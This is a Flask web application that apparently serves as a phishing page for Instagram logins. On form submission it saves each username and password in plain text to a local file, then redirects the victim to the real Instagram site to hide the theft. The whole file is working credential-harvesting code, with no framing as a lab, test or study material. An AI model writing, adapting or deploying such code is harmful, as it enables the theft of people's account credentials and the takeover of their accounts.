from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open('users.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')
        return redirect('https://www.instagram.com/')
    return render_template('form.html')

if __name__ == '__main__':
    app.run(debug=True)